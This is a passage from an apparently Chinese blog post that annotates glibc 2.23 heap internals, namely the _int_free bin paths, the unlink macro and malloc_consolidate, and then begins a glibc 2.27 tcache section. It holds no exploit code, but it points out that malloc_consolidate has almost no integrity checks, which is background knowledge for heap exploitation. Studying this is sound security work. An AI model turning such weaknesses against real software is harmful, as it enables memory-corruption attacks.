class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>)(get_max_fast ())</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> TRIM_FASTBINS</span></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">If TRIM_FASTBINS set, don&#x27;t place chunks</span></span><br><span class="line"><span class="comment">bordering top into fastbins</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">     &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line"><span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">   of system_mem might have let to a false positive.  Redo the test</span></span><br><span class="line"><span class="comment">   after getting the lock.  */</span></span><br><span class="line"><span class="keyword">if</span> (have_lock</span><br><span class="line">    || (&#123; assert (locked == <span class="number">0</span>);</span><br><span class="line">  mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">  locked = <span class="number">1</span>;</span><br><span class="line">  chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;</span><br><span class="line">      &#125;))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid next size (fast)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">if</span> (! have_lock)</span><br><span class="line">  &#123;</span><br><span class="line">    (<span class="type">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">    locked = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    set_fastchunks(av);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> idx = fastbin_index(size);<span class="comment">//计算索引</span></span><br><span class="line">    fb = &amp;fastbin (av, idx);<span class="comment">//初始化</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line"><span class="comment">/* Check that the top of the bin is not the record we are going to add</span></span><br><span class="line"><span class="comment">   (i.e., double free).  */</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">   size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">   only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">   deallocated.  See use of OLD_IDX below for the actual check.  */</span></span><br><span class="line"><span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">  old_idx = fastbin_index(chunksize(old));</span><br><span class="line">p-&gt;fd = old2 = old;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">errstr = <span class="string">&quot;invalid fastbin entry (free)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>malloc时的反操作??</p><h4 id="smallbin-amp-amp-largebin"><a href="#smallbin-amp-amp-largebin" class="headerlink" title="smallbin&amp;&amp;largebin"></a>smallbin&amp;&amp;largebin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Consolidate other non-mmapped chunks as they arrive.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">      (<span class="type">void</span>)mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">      locked = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    nextchunk = chunk_at_offset(p, size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Lightweight tests: check whether the block is already the</span></span><br><span class="line"><span class="comment">       top block.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))</span><br><span class="line">      &#123;</span><br><span class="line">errstr = <span class="string">&quot;double free or corruption (top)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">  &amp;&amp; (<span class="type">char</span> *) nextchunk</span><br><span class="line">  &gt;= ((<span class="type">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">errstr = <span class="string">&quot;double free or corruption (out)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="comment">/* Or whether the block is actually not marked used.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">      &#123;</span><br><span class="line">errstr = <span class="string">&quot;double free or corruption (!prev)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    nextsize = chunksize(nextchunk);</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">errstr = <span class="string">&quot;free(): invalid next size (normal)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"><span class="comment">//进行了一系列的检测</span></span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = p-&gt;prev_size;</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">      unlink(av, p, bck, fwd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">      <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* consolidate forward */</span></span><br><span class="line">      <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">unlink(av, nextchunk, bck, fwd);</span><br><span class="line">size += nextsize;</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);<span class="comment">//清除p位</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line"></span><br><span class="line">      bck = unsorted_chunks(av);<span class="comment">//      统一放入unsortedbin</span></span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">&#123;</span><br><span class="line">  errstr = <span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">  <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line">      p-&gt;fd = fwd;</span><br><span class="line">      p-&gt;bk = bck;</span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">&#123;</span><br><span class="line">  p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">  p-&gt;bk_nextsize = <span class="literal">NULL</span>;<span class="comment">//largebin清空nextsize链</span></span><br><span class="line">&#125;</span><br><span class="line">      bck-&gt;fd = p;</span><br><span class="line">      fwd-&gt;bk = p;<span class="comment">//fd,bk链设置</span></span><br><span class="line"></span><br><span class="line">      set_head(p, size | PREV_INUSE);<span class="comment">//设置p位</span></span><br><span class="line">      set_foot(p, size);<span class="comment">//设置下一个chunk的prev_size</span></span><br><span class="line"></span><br><span class="line">      check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">      consolidate into top</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123;<span class="comment">//nextchunk是topchunk的情况</span></span><br><span class="line">      size += nextsize;</span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      av-&gt;top = p;</span><br><span class="line">      check_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If freeing a large space, consolidate possibly-surrounding</span></span><br><span class="line"><span class="comment">      chunks. Then, if the total unused topmost memory exceeds trim</span></span><br><span class="line"><span class="comment">      threshold, ask malloc_trim to reduce top.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Unless max_fast is 0, we don&#x27;t know if there are fastbins</span></span><br><span class="line"><span class="comment">      bordering top, so we cannot tell for sure whether threshold</span></span><br><span class="line"><span class="comment">      has been reached unless fastbins are consolidated.  But we</span></span><br><span class="line"><span class="comment">      don&#x27;t want to consolidate on each free.  As a compromise,</span></span><br><span class="line"><span class="comment">      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span></span><br><span class="line"><span class="comment">      is reached.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">malloc_consolidate(av);<span class="comment">//触发malloc_consolidate</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class="line">    (<span class="type">unsigned</span> <span class="type">long</span>)(mp_.trim_threshold))<span class="comment">//收缩堆</span></span><br><span class="line">  systrim(mp_.top_pad, av);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">   large, because the corresponding heap might go away.  */</span></span><br><span class="line">heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line"></span><br><span class="line">assert(heap-&gt;ar_ptr == av);</span><br><span class="line">heap_trim(heap, mp_.top_pad);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">      assert (locked);</span><br><span class="line">      (<span class="type">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><ol><li>伴随一系列的检查,<strong>从低地址到高地址</strong>判断是否可进行合并</li><li>合并后的chunk的size若大于FASTBIN_CONSOLIDATION_THRESHOLD<ol><li>如果有fast chunk则触发malloc_consolidate</li><li>如果top<em>size大于mp</em>.trim_threshold,尝试systrim收缩堆,否则尝试heap_trim收缩堆</li></ol></li></ol><h2 id="附属"><a href="#附属" class="headerlink" title="附属"></a>附属</h2><h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="meta">    FD = P-&gt;fd;      \</span></span><br><span class="line"><span class="meta">    BK = P-&gt;bk;      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta">        FD-&gt;bk = BK;      \</span></span><br><span class="line"><span class="meta">        BK-&gt;fd = FD;      \</span></span><br><span class="line"><span class="meta">        <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)      \</span></span><br><span class="line"><span class="meta">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)      \</span></span><br><span class="line"><span class="meta">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span></span><br><span class="line"><span class="meta">      malloc_printerr (check_action,      \</span></span><br><span class="line"><span class="meta">       <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span></span><br><span class="line"><span class="meta">       P, AV);      \</span></span><br><span class="line"><span class="meta">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;      \</span></span><br><span class="line"><span class="meta">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)      \</span></span><br><span class="line"><span class="meta">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      \</span></span><br><span class="line"><span class="meta">                <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span></span><br><span class="line"><span class="meta">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      \</span></span><br><span class="line"><span class="meta">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      \</span></span><br><span class="line"><span class="meta">                  &#125;      \</span></span><br><span class="line"><span class="meta">              &#125; <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span></span><br><span class="line"><span class="meta">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span></span><br><span class="line"><span class="meta">              &#125;      \</span></span><br><span class="line"><span class="meta">          &#125;      \</span></span><br><span class="line"><span class="meta">      &#125;      \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure><p>脱链操作</p><h3 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate"></a>malloc_consolidate</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">malloc_consolidate</span><span class="params">(mstate av)</span></span><br><span class="line">&#123;</span><br><span class="line">  mfastbinptr*    fb;                 <span class="comment">/* current fastbin being consolidated */</span></span><br><span class="line">  mfastbinptr*    maxfb;              <span class="comment">/* last fastbin (for loop control) */</span></span><br><span class="line">  mchunkptr       p;                  <span class="comment">/* current chunk being consolidated */</span></span><br><span class="line">  mchunkptr       nextp;              <span class="comment">/* next chunk to consolidate */</span></span><br><span class="line">  mchunkptr       unsorted_bin;       <span class="comment">/* bin header */</span></span><br><span class="line">  mchunkptr       first_unsorted;     <span class="comment">/* chunk to link to */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* These have same use as in free() */</span></span><br><span class="line">  mchunkptr       nextchunk;</span><br><span class="line">  INTERNAL_SIZE_T size;</span><br><span class="line">  INTERNAL_SIZE_T nextsize;</span><br><span class="line">  INTERNAL_SIZE_T prevsize;</span><br><span class="line">  <span class="type">int</span>             nextinuse;</span><br><span class="line">  mchunkptr       bck;</span><br><span class="line">  mchunkptr       fwd;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If max_fast is 0, we know that av hasn&#x27;t</span></span><br><span class="line"><span class="comment">    yet been initialized, in which case do so below</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (get_max_fast () != <span class="number">0</span>) &#123;</span><br><span class="line">    clear_fastchunks(av);</span><br><span class="line"></span><br><span class="line">    unsorted_bin = unsorted_chunks(av);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Remove each chunk from fast bin and consolidate it, placing it</span></span><br><span class="line"><span class="comment">      then in unsorted bin. Among other reasons for doing this,</span></span><br><span class="line"><span class="comment">      placing in unsorted bin avoids needing to calculate actual bins</span></span><br><span class="line"><span class="comment">      until malloc is sure that chunks aren&#x27;t immediately going to be</span></span><br><span class="line"><span class="comment">      reused anyway.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    maxfb = &amp;fastbin (av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">    fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      p = atomic_exchange_acq (fb, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line">  nextp = p-&gt;fd;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">  size = p-&gt;size &amp; ~(PREV_INUSE|NON_MAIN_ARENA);</span><br><span class="line">  nextchunk = chunk_at_offset(p, size);</span><br><span class="line">  nextsize = chunksize(nextchunk);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = p-&gt;prev_size;</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">      size += nextsize;</span><br><span class="line">      unlink(av, nextchunk, bck, fwd);</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">      clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">    unsorted_bin-&gt;fd = p;</span><br><span class="line">    first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range (size)) &#123;</span><br><span class="line">      p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">      p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_head(p, size | PREV_INUSE);</span><br><span class="line">    p-&gt;bk = unsorted_bin;</span><br><span class="line">    p-&gt;fd = first_unsorted;</span><br><span class="line">    set_foot(p, size);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    size += nextsize;</span><br><span class="line">    set_head(p, size | PREV_INUSE);</span><br><span class="line">    av-&gt;top = p;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    malloc_init_state(av);</span><br><span class="line">    check_malloc_state(av);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将fastbin中的chunk逐个取出遍历</p><ol><li>判断prev_chunk是否可合并</li><li>判断next_chunk是不是top_chunk<ol><li>若不是则判断next_chunk是否在使用,不在使用则合并,在使用则清空next_chunk的prev_inuse位</li><li>若是则直接并到top_chunk</li></ol></li></ol><p><strong>可以看到与正常从fastbin中取出相比其中几乎没有检查</strong></p><h1 id="glibc2-27"><a href="#glibc2-27" class="headerlink" title="glibc2.27"></a>glibc2.27</h1><p>变化比较大的就是2.26的时候多了个tcache</p><h2 id="malloc-1"><a href="#malloc-1" class="headerlink" title="malloc"></a>malloc</h2><h3 id="libc-malloc-1"><a href="#libc-malloc-1" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 